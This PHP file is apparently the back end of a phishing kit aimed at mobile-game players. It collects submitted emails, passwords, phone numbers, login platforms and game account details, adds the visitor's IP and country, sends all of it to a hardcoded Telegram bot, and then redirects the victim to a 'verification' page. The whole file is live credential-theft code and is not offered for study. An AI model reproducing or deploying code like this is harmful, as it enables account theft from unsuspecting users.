<?php

$email = $_POST['email'];
$password = $_POST['password'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$cty = $_POST['cty'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$pk = $_SERVER['HTTP_HOST'];
 $uls= $_SERVER['REQUEST_URI'];

$platform = $_POST['platform'];
$login = $_POST['login'];
$platform = $_POST['platform'];
$cty1 = $_POST['cty1'];
$chresult = $_POST['chresult'];
$ch = $_POST['ch'];
$api_key = "26dc150b1cf3c41dc866400812300e6d";
$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1".

$ip);
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name;
$url1 = "https://www.koc3hy.xyz";
  $ip =$_SERVER['REMOTE_ADDR']
 
;$apiToken = "1885124596:AAHWwUYxCQyvc7ovrb9IKQWl95cvYSXHi68";
$chat = "1353631583";
$data = [
    'chat_id' => $chat,
    'text' => "⛥━━━⟪WELCOME ᯓ◝ 𓆩 ˹𝙀𝙇𝙕𝙊𝙕˼ 𓆪 ◜ᯓ ⟫━━━⛥ 
▬▭▬▭▬▭▬▭▬▭▬▭▬
⛥𝕐𝕆𝕌 ℍ𝔸𝕍𝔼 𝔸 ℕ𝔼𝕎 𝕃𝕆𝔾𝕀ℕ - >  𝙀𝙇𝙕𝙊𝙕🖤 ☁️☃️
𝐿𝑂𝐺𝐼𝑁🌬️ »$login
⛥𝔼𝕄𝔸𝕀𝕃 🤽‍♂» $email
⛥𝐏 𝐀 𝐒 𝐒 𝐖 𝐎 𝐑 𝐃🌹💛  »$password
⛥𝐏 𝐇 𝐎 𝐍 𝐄 ⚔️»$phone
⛥𝐂𝐎𝐔𝐍𝐓𝐑𝐘 🪐🤽‍♂ »$cty
⛥ƬƖЄƦ ☁️☃️»$tier
⛥𝐈𝐃 🐼💸»$playid
⛥𝐋𝐄𝐕𝐄𝐋 🐧💛»$level
⛥𝐼𝑃 🏠🍄»$ip
⛥𝐑 𝐏 🐦»$rpt
✶ 𝐃𝐀𝐓𝐄&𝐓𝐈𝐌𝐄 🖤🦁» $jamasuk
✶ 𝕀 ℕ 𝔻 𝔼 𝕏  𝕄 𝔸 𝔻 𝔼 𝔹 𝕐 ⇨‌@JJJJJj8f
▬▭▬▭▬▭▬▭▬▭▬▭▬ 


:☀️·　　　　🛸 　🌎　°　　🌓　•　　.°•　　　🚀 ✯✯
　　　★　*　　　💏　　°　　　　🛰　°·　　
.　　　•　°★　•
▁▂▃▄▅▆▇▇▆▅▄▃▁▂▃"];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

?>



<html> 
  <head> 
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script> 
<script> 
  window.dataLayer = window.dataLayer || []; 
  function gtag(){dataLayer.push(arguments);} 
  gtag('js', new Date()); 
 
  gtag('config', 'UA-159654279-2'); 
</script> 
 
    <meta http-equiv="Refresh" content="0; url='verification.php'" /> 
  </head> 
  <body> 
  </body> 
</html>